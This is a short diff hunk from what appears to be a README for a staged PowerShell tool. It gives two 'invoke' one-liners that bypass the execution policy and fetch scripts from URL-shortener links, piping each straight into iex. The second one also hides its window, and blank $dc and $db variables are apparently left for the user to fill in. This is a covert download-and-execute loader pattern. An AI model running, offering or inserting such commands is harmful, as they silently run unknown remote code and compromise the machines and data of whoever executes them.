@@ -26,6 +26,8 @@ Need to modify the invoke command to fit your needs :
 
 Invoke stage1.ps1 via windows : 
 powershell -NoP -Ep Bypass $dc='';$db='';irm https://shorturl.at/evBKX | iex
+
+Invoke stage2.ps1 via windows : 
 powershell -w h -NoP -Ep Bypass $dc='';$db='';irm https://shorturl.at/rLQS5 | iex
 
 
